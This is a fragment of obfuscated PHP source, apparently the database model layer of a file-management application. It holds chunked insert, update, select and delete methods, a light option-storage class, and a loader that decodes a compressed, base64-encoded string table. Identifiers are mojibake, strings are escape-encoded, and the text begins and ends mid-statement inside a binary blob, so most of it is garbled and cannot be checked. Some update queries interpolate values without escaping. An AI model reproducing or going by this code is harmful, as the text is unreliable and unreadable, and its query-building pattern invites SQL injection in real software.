$‘ìî®ï¨[12]; } } } } private function dataAfterFilter(&$ôÀ»ê®´) { $·ãÀ«Ğƒ =& $_SERVER[èùÙ¹Ïö]; foreach ($this->dataAuto as $×“‹ÏŒÛ) { $Ä•÷ ï = $×“‹ÏŒÛ[0]; if (!isset($ôÀ»ê®´[$Ä•÷ ï])) { continue; } if (!in_array($·ãÀ«Ğƒ[403], explode($·ãÀ«Ğƒ[50], $×“‹ÏŒÛ[2]))) { continue; } switch (trim($×“‹ÏŒÛ[3])) { case $·ãÀ«Ğƒ[367]: case $·ãÀ«Ğƒ[368]: $‚ª¹öìª = isset($×“‹ÏŒÛ[4]) ? (array) $×“‹ÏŒÛ[4] : array(); array_unshift($‚ª¹öìª, $ôÀ»ê®´[$Ä•÷ ï]); if (isset($×“‹ÏŒÛ[4]) && $×“‹ÏŒÛ[4] == $·ãÀ«Ğƒ[423]) { $‚ª¹öìª = array($ôÀ»ê®´[$Ä•÷ ï]); } if ($·ãÀ«Ğƒ[367] == $×“‹ÏŒÛ[3]) { $ôÀ»ê®´[$Ä•÷ ï] = call_user_func_array($×“‹ÏŒÛ[1], $‚ª¹öìª); } else { $ôÀ»ê®´[$Ä•÷ ï] = call_user_func_array(array(&$this, $×“‹ÏŒÛ[1]), $‚ª¹öìª); } break; case $·ãÀ«Ğƒ[316]: if (isset($ôÀ»ê®´[$Ä•÷ ï]) && $ôÀ»ê®´[$Ä•÷ ï]) { $ôÀ»ê®´[$Ä•÷ ï] = call_user_func_array(array(&$this, $×“‹ÏŒÛ[1]), array($ôÀ»ê®´[$Ä•÷ ï])); } break; case $·ãÀ«Ğƒ[319]: $ôÀ»ê®´[$Ä•÷ ï] = $ôÀ»ê®´[$×“‹ÏŒÛ[1]]; break; case $·ãÀ«Ğƒ[340]: $Ì¯½ÕŒó = $ôÀ»ê®´[$Ä•÷ ï]; $ôÀ»ê®´[$Ä•÷ ï] = json_decode($Ì¯½ÕŒó, !0); if (is_null($ôÀ»ê®´[$Ä•÷ ï])) { $ôÀ»ê®´[$Ä•÷ ï] = $Ì¯½ÕŒó; } break; case $·ãÀ«Ğƒ[369]: if ($ôÀ»ê®´[$Ä•÷ ï] === $·ãÀ«Ğƒ[12]) { unset($ôÀ»ê®´[$Ä•÷ ï]); } break; case $·ãÀ«Ğƒ[370]: $ôÀ»ê®´[$Ä•÷ ï] = $×“‹ÏŒÛ[1]; break; default: break; } } } public function saveAll($ Œ”‚ûç) { $·¸Å’” =& $_SERVER[èùÙ¹Ïö]; $˜çôô¥‰ = $this->tablePrefix . $this->tableName; $ßÁ¢Ù‚­ = self::SQL_WHERE_IN_CHUNK; $ Œ”‚ûç = is_array($ Œ”‚ûç) ? $ Œ”‚ûç : array(); $Í¬„àÊ— = $·¸Å’”[424]; $¼û äõ“ = 0; $î‚…Ş®‘ = array(); $¥ÈŒôıÌ = count($ Œ”‚ûç); for ($Äùí²Şë = 0; $Äùí²Şë < $¥ÈŒôıÌ; $Äùí²Şë++) { $¨èü±Ø¢ = $ Œ”‚ûç[$Äùí²Şë]; if (!is_array($¨èü±Ø¢) || count($¨èü±Ø¢) != 4) { continue; } $¿İŞ‚ûö = "\125\120\104\x41\x54\105\x20\140{$˜çôô¥‰}\x60\40\x53\x45\x54\x20{$¨èü±Ø¢[2]}\x20\x3d\x20\x43\101\x53\105\40{$¨èü±Ø¢[0]}\40\xa"; if ($¼û äõ“ == 0) { $Í¬„àÊ— = $¿İŞ‚ûö; } $î‚…Ş®‘[] = $·¸Å’”[120] . $¨èü±Ø¢[1] . $·¸Å’”[120]; $¼û äõ“++; $Í¬„àÊ— .= "\40\127\110\x45\116\40\x27{$¨èü±Ø¢[1]}\x27\x20\x54\110\x45\116\x20\x27{$¨èü±Ø¢[3]}\47\40\12"; if ($¼û äõ“ == $ßÁ¢Ù‚­ || $Äùí²Şë == $¥ÈŒôıÌ - 1) { $´Óğ†½Â = implode($·¸Å’”[50], $î‚…Ş®‘); $Í¬„àÊ— .= "\40\105\x4e\104\x20\40\x57\110\105\x52\105\40{$¨èü±Ø¢[0]}\x20\111\116\40\50{$´Óğ†½Â}\51\40"; $this->execute($Í¬„àÊ—); $¼û äõ“ = 0; $Í¬„àÊ— = $¿İŞ‚ûö; $this->chunkEventCheck(count($î‚…Ş®‘)); $î‚…Ş®‘ = array(); } } $this->chunkEventSet(); } public function saveAllEach($½Å¤¥ù) { $î°Ù¯ò =& $_SERVER[èùÙ¹Ïö]; $ÒÌ‡ƒ¶Ì = $this->tablePrefix . $this->tableName; foreach ($½Å¤¥ù as $Ò§Á£Àˆ) { if (!is_array($Ò§Á£Àˆ) || count($Ò§Á£Àˆ) != 4) { continue; } $üëåÒŞö = $Ò§Á£Àˆ[0] . $î°Ù¯ò[425] . $Ò§Á£Àˆ[1] . $î°Ù¯ò[120]; $Ö³éĞ’î = $Ò§Á£Àˆ[2] . $î°Ù¯ò[425] . $Ò§Á£Àˆ[3] . $î°Ù¯ò[120]; $¸ñ™Ÿ® = "\165\x70\144\x61\x74\x65\x20{$ÒÌ‡ƒ¶Ì}\40\163\x65\x74\x20{$Ö³éĞ’î}\x20\167\150\x65\162\x65\x20{$üëåÒŞö}\x3b"; $this->execute($¸ñ™Ÿ®); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($°Š¸Ï½– = false, $¢ˆìüï® = false) { $this->_chunkEvent = $°Š¸Ï½–; $this->_chunkEventParam = $¢ˆìüï®; } private function chunkEventCheck($‰„‹Êîû) { if (!$this->_chunkEvent) { return; } $ªçëÓó£ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ªçëÓó£[$_SERVER[èùÙ¹Ïö][426]] = $‰„‹Êîû; Hook::trigger($this->_chunkEvent, $ªçëÓó£); } public function addAll($ÖŒ»¶«², $°ß®’ = array(), $ŞâÉßö = false) { $•è™ßûŒ =& $_SERVER[èùÙ¹Ïö]; ignore_timeout(); $‰¼‚êë = self::SQL_WHERE_IN_CHUNK; if (empty($ÖŒ»¶«²)) { $this->error = think_lang($•è™ßûŒ[317]); return !1; } $°ß®’ = $this->_parseOptions($°ß®’); foreach ($ÖŒ»¶«² as $Ğ˜™´’æ => $›ƒíÉøõ) { $ÖŒ»¶«²[$Ğ˜™´’æ] = $this->_facade($›ƒíÉøõ); $this->_beforeInsert($ÖŒ»¶«²[$Ğ˜™´’æ], $°ß®’); } if (method_exists($this->db, $•è™ßûŒ[318])) { for ($”»íğ˜™ = 0; $”»íğ˜™ < count($ÖŒ»¶«²); $”»íğ˜™ += $‰¼‚êë) { $¹¾ÉÆ‚» = array_slice($ÖŒ»¶«², $”»íğ˜™, $‰¼‚êë); if (!is_array($¹¾ÉÆ‚») || count($¹¾ÉÆ‚») == 0) { break; } $îşš¹Ø³ = $this->db->insertAll($¹¾ÉÆ‚», $°ß®’, $ŞâÉßö); $this->chunkEventCheck(count($¹¾ÉÆ‚»)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÖŒ»¶«² as $Ğ˜™´’æ => $›ƒíÉøõ) { $îşš¹Ø³ = $this->db->insert($›ƒíÉøõ, $°ß®’, $ŞâÉßö); } $this->commit(); } if (!1 !== $îşš¹Ø³) { $£Í¸·Ê = $this->getLastInsID(); if ($£Í¸·Ê) { return $£Í¸·Ê; } } return $îşš¹Ø³; } public function save($Ú—¬èË = '', $Øóó¤Ã = array()) { $Ã»ş€¹Í =& $_SERVER[èùÙ¹Ïö]; $„®ä¨Èö = self::SQL_WHERE_IN_CHUNK; $„Ÿù‡– = $this->optionsValue(); $ñşş±“ = $this->findWhereField($„Ÿù‡–); if (!$ñşş±“) { return parent::save($Ú—¬èË, $Øóó¤Ã); } $ŞÈğ¿íâ = 0; $Ì÷¬ŞĞ£ = $„Ÿù‡–[$Ã»ş€¹Í[321]][$ñşş±“][1]; $Ì÷¬ŞĞ£ = is_array($Ì÷¬ŞĞ£) ? $Ì÷¬ŞĞ£ : array(); $ˆü„†ïÅ = count($Ì÷¬ŞĞ£); for ($×ùÙç‡ˆ = 0; $×ùÙç‡ˆ < $ˆü„†ïÅ; $×ùÙç‡ˆ += $„®ä¨Èö) { $İç¯í = array_slice($Ì÷¬ŞĞ£, $×ùÙç‡ˆ, $„®ä¨Èö); if (!is_array($İç¯í) || count($İç¯í) == 0) { break; } $„Ÿù‡–[$Ã»ş€¹Í[321]][$ñşş±“][1] = $İç¯í; $this->optionsValue($„Ÿù‡–); $ŞÈğ¿íâ += parent::save($Ú—¬èË, $Øóó¤Ã); $this->chunkEventCheck(count($İç¯í)); } $this->chunkEventSet(); return $ŞÈğ¿íâ; } public function add($…²µÌş… = '', $’á÷õÆ¥ = array(), $º†ª¥£ˆ = false) { if ($this->addTaskStatus && is_array($…²µÌş…)) { $this->addTaskData[] = $…²µÌş…; return; } return parent::add($…²µÌş…, $’á÷õÆ¥, $º†ª¥£ˆ); } public function parseWhereLike($­ëÚô€Ä, $Êøşç¿˜ = '', $Ñó¯ˆ…Î = false, &$¹µçÕğĞ = false) { $¹À±±‹ =& $_SERVER[èùÙ¹Ïö]; $ºÌˆ¢ = $GLOBALS[$¹À±±‹[6]][$¹À±±‹[427]]; if (!$ºÌˆ¢[$¹À±±‹[428]]) { return $­ëÚô€Ä; } if (!is_array($­ëÚô€Ä)) { return $­ëÚô€Ä; } $†¯ÏÌãß = array(); $Â¶™‹–Ş = 0; foreach ($­ëÚô€Ä as $Ù±³˜ß‚ => $£¦†Áöî) { if (is_array($£¦†Áöî) && count($£¦†Áöî) == 2 && $£¦†Áöî[0] == $¹À±±‹[429] && is_string($£¦†Áöî[1]) && substr($£¦†Áöî[1], 0, 1) == $¹À±±‹[430] && substr($£¦†Áöî[1], strlen($£¦†Áöî[1]) - 1, 1) == $¹À±±‹[430]) { $¹µçÕğĞ = !0; $°û²ÅÖ± = is_string($Ù±³˜ß‚) ? $Ù±³˜ß‚ : $Êøşç¿˜; $îé«³ğ = substr($£¦†Áöî[1], 1, strlen($£¦†Áöî[1]) - 2); $îé«³ğ = $this->db->escapeString($îé«³ğ); if (!strpos($°û²ÅÖ±, $¹À±±‹[10])) { $°û²ÅÖ± = $¹À±±‹[431] . $°û²ÅÖ± . $¹À±±‹[431]; } $†¶¯Ü— = $¹À±±‹[205] . $îé«³ğ . $¹À±±‹[205]; $îé«³ğ = str_replace(array($¹À±±‹[10], $¹À±±‹[432], $¹À±±‹[11]), $¹À±±‹[433], $îé«³ğ); if ($ºÌˆ¢[$¹À±±‹[434]]) { $†¶¯Ü— = $¹À±±‹[435] . $îé«³ğ . $¹À±±‹[436]; if ($ºÌˆ¢[$¹À±±‹[437]]) { $†¶¯Ü— = $¹À±±‹[436] . $îé«³ğ . $¹À±±‹[435]; } } $†¯ÏÌãß[$Â¶™‹–Ş] = $¹À±±‹[438] . $°û²ÅÖ± . $¹À±±‹[439] . $†¶¯Ü— . $¹À±±‹[440]; $Â¶™‹–Ş++; continue; } if (is_array($£¦†Áöî)) { $Êøşç¿˜ = is_string($Ù±³˜ß‚) ? $Ù±³˜ß‚ : $Êøşç¿˜; $£¦†Áöî = $this->parseWhereLike($£¦†Áöî, $Êøşç¿˜, !0, $¹µçÕğĞ); } if (is_numeric($Ù±³˜ß‚)) { $†¯ÏÌãß[$Â¶™‹–Ş] = $£¦†Áöî; $Â¶™‹–Ş++; } else { $†¯ÏÌãß[$Ù±³˜ß‚] = $£¦†Áöî; } } if ($¹µçÕğĞ && !$Ñó¯ˆ…Î) { } return $†¯ÏÌãß; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Ëù³£Ìï = array()) { $€ÒŠ·ç =& $_SERVER[èùÙ¹Ïö]; $œ¡¥åÖ = self::SQL_WHERE_IN_CHUNK; $¥¬ĞÕÀ‰ = $this->optionsValue(); $Ò«ã‘â™ = $this->findWhereField($¥¬ĞÕÀ‰); if (!$Ò«ã‘â™ || isset($¥¬ĞÕÀ‰[$€ÒŠ·ç[338]]) || isset($¥¬ĞÕÀ‰[$€ÒŠ·ç[399]])) { return parent::select($Ëù³£Ìï); } $ø£×í‘· = $¥¬ĞÕÀ‰[$€ÒŠ·ç[321]][$Ò«ã‘â™][1]; $ø£×í‘· = is_array($ø£×í‘·) ? $ø£×í‘· : array(); $¦¢’¸Ï™ = null; for ($‚Ãø¢ù = 0; $‚Ãø¢ù < count($ø£×í‘·); $‚Ãø¢ù += $œ¡¥åÖ) { $ŒùÒí¤ã = array_slice($ø£×í‘·, $‚Ãø¢ù, $œ¡¥åÖ); if (!is_array($ŒùÒí¤ã) || count($ŒùÒí¤ã) == 0) { break; } $¥¬ĞÕÀ‰[$€ÒŠ·ç[321]][$Ò«ã‘â™][1] = $ŒùÒí¤ã; $this->optionsValue($¥¬ĞÕÀ‰); $×ğ·¤ı“ = parent::select($Ëù³£Ìï); if (!$×ğ·¤ı“) { continue; } $¦¢’¸Ï™ = is_array($¦¢’¸Ï™) ? $¦¢’¸Ï™ : array(); $¦¢’¸Ï™ = array_merge($¦¢’¸Ï™, $×ğ·¤ı“); } return $¦¢’¸Ï™; } public function delete($—Ğç¨Ä€ = array()) { $«ÌÀ‡²Ö =& $_SERVER[èùÙ¹Ïö]; $Ô…®Õ÷Ş = self::SQL_WHERE_IN_CHUNK; $„•·¾¥¯ = $this->optionsValue(); $•¼Ãìò¼ = $this->findWhereField($„•·¾¥¯); if (!$•¼Ãìò¼) { return parent::delete($—Ğç¨Ä€); } $¼ÜÇÛµ = 0; $Äß‹É¤Æ = $„•·¾¥¯[$«ÌÀ‡²Ö[321]][$•¼Ãìò¼][1]; $Äß‹É¤Æ = is_array($Äß‹É¤Æ) ? $Äß‹É¤Æ : array(); for ($Ï„·µú¡ = 0; $Ï„·µú¡ < count($Äß‹É¤Æ); $Ï„·µú¡ += $Ô…®Õ÷Ş) { $Á§¶®‚ƒ = array_slice($Äß‹É¤Æ, $Ï„·µú¡, $Ô…®Õ÷Ş); if (!is_array($Á§¶®‚ƒ) || count($Á§¶®‚ƒ) == 0) { break; } $„•·¾¥¯[$«ÌÀ‡²Ö[321]][$•¼Ãìò¼][1] = $Á§¶®‚ƒ; $this->optionsValue($„•·¾¥¯); $¼ÜÇÛµ += parent::delete($—Ğç¨Ä€); } return $¼ÜÇÛµ; } private function findWhereField($“ú”ôôĞ) { $ŸÓÇ¤Ã =& $_SERVER[èùÙ¹Ïö]; $ğÕ˜·àª = self::SQL_WHERE_IN_CHUNK; if (!is_array($“ú”ôôĞ) || !is_array($“ú”ôôĞ[$ŸÓÇ¤Ã[321]])) { return !1; } foreach ($“ú”ôôĞ[$ŸÓÇ¤Ã[321]] as $†½ã„äÉ => $ß³¢ÉŠ¿) { if (is_array($ß³¢ÉŠ¿) && isset($ß³¢ÉŠ¿[0]) && is_string($ß³¢ÉŠ¿[0]) && strtolower($ß³¢ÉŠ¿[0]) == $ŸÓÇ¤Ã[7] && is_array($ß³¢ÉŠ¿[1]) && count($ß³¢ÉŠ¿[1]) > $ğÕ˜·àª) { ignore_timeout(); return $†½ã„äÉ; } } return !1; } public function setMasterDB($êÛß‘Á = true) { think_config($_SERVER[èùÙ¹Ïö][441], $êÛß‘Á); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\145\x6d\x4f\160\x74\x69\157\156"; public $field = array(); public function listData($İæ«¢€Î = false, $ÙÌ´¬“ = "\155\157\144\x69\146\171\124\151\x6d\145", $æÓñÆ¤ = false) { $¬½Ü´©Ş = Model($this->modelType)->get(!1, $this->optionType, !0); $†äÈËŠŠ = array_values($¬½Ü´©Ş); if ($†äÈËŠŠ && $†äÈËŠŠ[0] && !is_array($†äÈËŠŠ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¬½Ü´©Ş = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¬½Ü´©Ş) { return $İæ«¢€Î ? null : array(); } if (!$İæ«¢€Î) { $¬½Ü´©Ş = array_filter(array_values($¬½Ü´©Ş)); return array_sort_by($¬½Ü´©Ş, $ÙÌ´¬“, $æÓñÆ¤); } return $¬½Ü´©Ş[$_SERVER[èùÙ¹Ïö][442] . $İæ«¢€Î]; } public function insert($‰ò¶¤Ó) { $Á©—¾ó =& $_SERVER[èùÙ¹Ïö]; $‰ò¶¤Ó = array_field_key($‰ò¶¤Ó, $this->field); $üïì³ï = Model($this->modelType)->get($Á©—¾ó[443], $this->optionType . $Á©—¾ó[444]); $üïì³ï = $üïì³ï ? $üïì³ï : 0; $‰ò¶¤Ó[$Á©—¾ó[445]] = ++$üïì³ï; $‰ò¶¤Ó[$Á©—¾ó[217]] = time(); $‰ò¶¤Ó[$Á©—¾ó[87]] = time(); Model($this->modelType)->set($Á©—¾ó[443], $üïì³ï, $this->optionType . $Á©—¾ó[444]); Model($this->modelType)->set($Á©—¾ó[442] . $üïì³ï, $‰ò¶¤Ó, $this->optionType); return $üïì³ï; } public function update($¯ç’§Ø—, $ÁìâÁû‡) { $Öâé®ÚÏ =& $_SERVER[èùÙ¹Ïö]; $ÁìâÁû‡ = array_field_key($ÁìâÁû‡, $this->field); $€£Ç®„ = $this->listData($¯ç’§Ø—); if (!$€£Ç®„ || !$¯ç’§Ø—) { return !1; } $ÁìâÁû‡ = array_merge($€£Ç®„, $ÁìâÁû‡); $ÁìâÁû‡[$Öâé®ÚÏ[87]] = time(); return Model($this->modelType)->set($Öâé®ÚÏ[442] . $¯ç’§Ø—, $ÁìâÁû‡, $this->optionType); } public function remove($ĞÉ¹¡ê) { if (!$ĞÉ¹¡ê) { return !1; } return Model($this->modelType)->remove($_SERVER[èùÙ¹Ïö][442] . $ĞÉ¹¡ê, $this->optionType); } public function clear() { $êœ¢€ =& $_SERVER[èùÙ¹Ïö]; Model($this->modelType)->remove($êœ¢€[443], $this->optionType . $êœ¢€[444]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ò˜˜Ï´¼, $°¡ØÅ») { if (!$°¡ØÅ») { return !1; } $óåª¡«· = $this->listData(); $óåª¡«· = array_to_keyvalue($óåª¡«·, $Ò˜˜Ï´¼); return isset($óåª¡«·[$°¡ØÅ»]) ? $óåª¡«·[$°¡ØÅ»] : !1; } public function findByName($ñİúèËî) { return $this->findByKey($_SERVER[èùÙ¹Ïö][32], $ñİúèËî); } protected function resetData($ÈÉÍ“ı) { $’Öàšñ¸ =& $_SERVER[èùÙ¹Ïö]; $ÈÉÍ“ı = is_array($ÈÉÍ“ı) ? $ÈÉÍ“ı : array(); $åÈ–àŞ§ = array(); for ($›ŸÊ–…ˆ = 0; $›ŸÊ–…ˆ < count($ÈÉÍ“ı); $›ŸÊ–…ˆ++) { $åÈ–àŞ§[$’Öàšñ¸[442] . $ÈÉÍ“ı[$›ŸÊ–…ˆ][$’Öàšñ¸[445]]] = $ÈÉÍ“ı[$›ŸÊ–…ˆ]; } return Model($this->modelType)->set($åÈ–àŞ§, !1, $this->optionType); } private function getAutoName($ÉÃ»çø») { $ê¢ëÌÎ¶ = array_to_keyvalue($this->listData(), $_SERVER[èùÙ¹Ïö][32]); if (!$ê¢ëÌÎ¶ || !isset($ê¢ëÌÎ¶[$ÉÃ»çø»])) { return $ÉÃ»çø»; } for ($¶ƒµ£áÂ = 1; $¶ƒµ£áÂ < count($ê¢ëÌÎ¶); $¶ƒµ£áÂ++) { $üÚ´Ëªˆ = $ÉÃ»çø» . "\x28{$¶ƒµ£áÂ}\51"; if (!isset($ê¢ëÌÎ¶[$üÚ´Ëªˆ])) { return $üÚ´Ëªˆ; } } return $üÚ´Ëªˆ; } } goto cÙºŞ¹äÒ; cÒæÍ™Ï: define($_SERVER[èùÙ¹Ïö][287], 1); define($_SERVER[èùÙ¹Ïö][288], 0); define($_SERVER[èùÙ¹Ïö][289], 2); goto fê‚ÖÒÈê—; F„ÕÂÆÃ±¡: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\350\371\331\271\317\366", "\xdd\xd7\x83\x96\xa2\x8d"); $_SERVER[èùÙ¹Ïö] = explode("\174\2\174\4\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\7\170\34\325\325\50\275\207\36\340\45\20\6\141\133\222\275\105\226\55\27\331\262\130\111\53\153\355\225\126\336\135\271\112\36\217\166"."\x67\xb5\x63\xed\xee\xac\x66\x66\xd5\x6c\x53\x12\x3a\x98\xde\x9\x25\x21\x84\x16\x4c\x9\x1\xc\xa1\x99\x4\x48\x28\xa1\x84\xde\x12\xc0\x36\x24\x10\x2\xa1\x84\x84\xf2\x6e\x39\xb7\xcc\xec\xa\xfe".base64_decode('9733fc+f7b333DK3nHvuueeec+6LXzzz8R8eXL/T+l3W7/zcx5c9+PkWGkb/dlq/Gw==')."\xd\x1f\x79\xc6\x1e\x3b\x90\x3f\x7\x9d\x71\x7a\x4d\x4d\xc7\xac\xbd\xa6\x75\xed\x73\xf6\x1d\x37\x6b\x37\x68\x37\x6a\x67\xc4\xa2\x8f\x3f\x11\xf9\xde\x53\xbf\x5a\x14\xde\x76\xcd\xe3\x63\xdb\x76\xdc".strrev('‹´*? 4èé¼ôµ\'§ôƒ@£a ÆBÌ¤6;a¨ú(é‚”HÛ-3(%ÃLÿÁ').strrev('9­ Ap^¢Í§W#Z–ê/ß-,ÔT!¦o=9F¦BO;»§¢j’Åv®–åoü')."\132\277\146\103\115\155\55\152\133\270\73\32\133\241\46\127\164\207\41\107\277\72\124\322\255\61\32\43\301\204\243\131\116\322\310\353\74\307\210\305\333\325\22\136\30\351\122\222\361"."\120\127\42\324\232\214\304\272\50\270\65\326\331\31\111\226\303\343\261\150\264\45\324\272\270\74\245\73\36\132\330\31\122\120\373\162\272\152\24\62\146\215\262\206\246\254\121\152\151"."\240\335\320\163\151\32\54\150\254\71\316\130\21\102\111\36\102\323\124\50\345\162\64\322\305\103\151\75\243\225\162\60\132\155\162\244\150\31\171\215\165\172\261\76\306\241\64\240\225"."\x1c\xd3\x28\xa4\x68\x24\x3c\xea\x58\x9a\x80\xa3\xb6\xa6\xd0\x44\xeb\x5\xa8\x2a\x11\x8e\x86\x5b\x93\xa\x6e\xa0\xd2\x1e\x8f\x75\x2a\x30\x9\x79\xcd\x76\x74\x4b\x59\xd6\x11\x8e\x87\x15\xdc\xe8\xa6".strrev('55#¤Íª'."\0".'…›Ï™”¡Š–•Ço,¨TËCU‘|ôpj‰•FŠ…'."\r".'¥ğj×Òj').strrev('wPM~á«H:hbW-aÔs“:X®Ÿ€’ÔQ%¹ĞcÌ"{{X‘“Á;Ğ€Ó')."\310\50\30\45\100\123\250\302\64\371\262\202\100\211\345\326\31\104\117\103\40\217\312\233\120\256\37\140\375\54\227\201\26\346\60\15\66\55\240\277\363\240\130\277\212\323\164\313\121"."\xf5\x42\xca\x4c\x1b\x5\x58\xbe\xcd\x80\x86\x9a\x93\x6d\xb3\xc\x94\x81\xc6\x33\x66\x2e\xcd\xc2\xb6\x31\xe\x9d\xcb\x18\x39\xbd\xab\x94\x97\xb3\xf0\x68\x2a\x6b\xe4\xd2\x16\x5b\x71\xdf\x96\x93\x46"."\243\174\1\343\274\42\126\104\55\341\153\337\310\214\211\25\210\363\165\363\124\333\54\131\51\75\202\126\14\215\117\7\260\356\70\250\163\154\100\314\236\142\316\324\322\11\335\342\135"."\x33\xcc\x76\x54\x51\xac\xe4\xc8\xc0\x12\xc9\xd6\x6e\x5a\xf9\x36\x44\x2b\xe0\xfb\x68\x9d\x18\x3d\x15\x12\x6\xd9\x4a\x49\x4b\x23\x16\xac\x59\x75\x82\xff\xeb\xbe\x55\xc7\xa0\xff\x6a\x81\x18\xf6\x42".base64_decode('m7J6LqfqozospXy6wWaDEbT7jUIQQWg0ElOzmp3tTDeopBSjsWl9NFDMFmGd86Xd6w==')."\x42\x75\x3c\x74\x5d\xa6\x13\x96\x28\x75\xce\x4c\x69\x39\xb9\x8b\x34\x9c\x75\x9c\x62\x42\x2f\xa4\xf1\x48\x40\x57\xcc\x91\x2\x19\xa9\xa2\xae\x43\xa6\x36\x9f\x92\x56\x3a\x95\x15\x4a\x47\xa3\xd1\x68"."\xb3\x82\xf9\x1c\xf\xb1\xde\x71\x98\xcd\x81\xce\x28\x9b\xce\x74\x6\x90\x94\x6d\x14\x55\xf0\x41\xc3\x26\x34\x4f\x2c\x58\xad\x58\xcc\x19\x29\xcd\x31\xcc\x42\xd0\x4c\x39\xba\xe3\xb7\x1d\x4b\xd7\xa0".base64_decode('xlAqpdu2v9UsOJaZ84dyOXPEH7OMAaPQqEwF8osS0TL3Y5LYCGu3ap6CEQd/ZmpTyQ==').base64_decode('yfjnsDXJc1tawc7olj8MK6NRQY3ldJFlazPsomkbuHmNiuY4WiqLaYqovulb8huFnA==')."\121\320\313\362\206\107\213\206\245\333\254\255\312\302\316\44\124\202\152\327\375\335\226\66\220\327\32\225\142\251\37\215\14\254\324\12\60\232\33\206\246\121\111\341\250\117\311\227\154"."\xc7\x6f\xe9\x88\x38\x19\x68\x3\x84\x41\x8e\x64\xfc\x9d\x78\x5d\x19\x7a\xda\x9f\x40\x34\x1c\xc0\x33\xea\x66\x2a\x8\x75\x14\x96\x46\xa1\x1d\xc9\x64\xb7\x1a\x69\x47\x9b\x74\x57\x58\xed\xc\x25\x5b"."\73\240\331\216\66\300\332\34\105\224\231\127\311\200\313\375\150\175\141\344\352\102\175\25\300\156\163\104\267\320\207\133\306\32\225\101\63\335\157\216\6\130\22\316\234\100\204\206\145"."\xc6\xd3\x5d\x74\xfc\x71\xad\x30\x80\xc7\xa7\x7f\xcc\xd1\x6d\x2f\xa9\x6a\x41\x5b\x7a\x20\x43\x17\x73\xa0\x5f\xcf\x98\x16\xf4\xc6\x1e\x1e\x70\xcf\x45\x54\x2f\xc\x38\x59\x56\x77\x22\x1c\x5f\x1a\x8e"."\253\211\130\173\162\131\50\16\34\100\1\41\322\50\153\15\376\172\316\37\327\323\150\166\122\16\53\247\25\361\300\262\74\170\375\340\217\263\124\274\246\130\132\64\262\20\217\135\233".base64_decode('30aZ/HIuVnfUyBu4ew5PIYON2IOF0KAg6XNTrz21pjc9rdaP/p9au6q3LTC1rzloiA==')."\62\301\351\201\351\112\175\335\54\245\33\361\53\206\226\123\240\323\145\71\352\224\330\142\367\260\10\204\57\230\5\375\133\6\7\157\170\22\145\360\14\53\5\306\303\113\172\302\211"._kodDe('Kc+ZQw65a9XP1uB5BRuXzlKsod2gFEQ1FfIUAkZSsG7PiWUdSOHKgFSYG1xIDVkzW4c=')."\327\6\244\175\100\165\157\23\70\206\23\73\5\162\40\54\133\146\244\371\76\202\242\35\272\61\220\205\1\63\160\165\51\63\147\132\132\16\123\117\266\160\164\106\321\6\14\240\150"."\xc5\x5c\x9\xe1\x4c\x10\x7f\x21\x99\x2d\xe5\xfb\x81\xe8\x23\xb6\x71\x40\x77\x4\x57\x66\x8f\x21\xd6\x25\xcf\x36\x37\xb4\x43\x3a\x91\x36\xd7\x16\x6\xb1\xa0\x8a\xe7\xb9\x37\x50\x2c\xc\xd4\x4e\x82"."\xba\xd4\xfa\x86\x3a\xc\x0\x14\x85\x2e\x22\xf6\xb4\xa4\x97\x8f\x41\x20\x65\xa2\x45\xd1\xa9\xd\xea\x8d\xb8\x53\x40\x62\xe6\x11\x28\x8b\x48\xb4\x67\x1e\xde\x2e\x9a\xbc\x6b\xa\xcf\x53\x2e\x90\x47"."\225\220\72\133\115\276\301\321\3\300\74\367\166\241\350\226\145\132\107\101\16\22\126\310\236\203\347\15\52\167\370\16\156\243\345\303\302\131\223\357\370\246\5\241\306\40\364\173\162"."\x7d\x3b\xdb\xf\x83\x89\x19\xe8\xaf\xd8\xfc\xd2\x66\x5e\x63\x5b\x9\xd9\x4\xf4\x34\xdd\x5\x28\x68\xaa\x2b\xa5\x43\xd7\x4\x1b\xe3\x58\x8e\x89\xa1\x96\x2b\xb\xc2\xa7\xac\x9\x78\x8d\xe6\xd\x9a".base64_decode('VOJtY61M6zmd4UJWZxtpHWRDY8cxJcNRFnHICCo4GMOOo5J422PxZfhIIQB474eZFw==')."\301\34\32\367\30\301\175\21\357\266\364\214\1\344\252\200\120\263\123\263\6\131\307\120\111\261\152\160\104\132\121\355\75\321\250\332\32\353\112\242\23\11\205\54\213\107\222\141\266"."\x82\x43\x6d\x6a\xa8\xb5\x9b\xc6\x38\x4f\x42\x68\x70\xf9\x6\x4b\x21\xc3\xf5\x30\xc9\xa8\x11\x41\xc1\x9\xa0\x4d\xad\x68\x16\x6c\xdd\x9f\x82\x12\xe2\xbc\x52\x96\x94\x16\x1b\x25\xd0\x59\xb1\xb9\x7a"."\xf6\xcb\x51\xbf\x96\x1f\xf7\xe7\x11\x9\xf0\xf3\xe6\xb9\xd9\x14\x5\x36\x50\xca\xed\x44\x60\x9a\xc4\xfe\x87\x7\xf\xad\x42\xc6\x1f\x75\xc7\x12\x50\xa0\x19\x43\x11\x8f\xda\xcf\x17\x4b\x77\xf\x24"."\345\45\24\131\30\6\340\136\200\125\131\15\70\317\320\262\4\333\273\112\50\277\145\214\153\242\113\315\254\75\254\43\371\234\140\171\335\275\362\213\231\107\125\316\364\167\164\206\132"."\375\211\216\120\175\303\54\12\135\221\117\367\46\73\14\273\167\45\217\303\2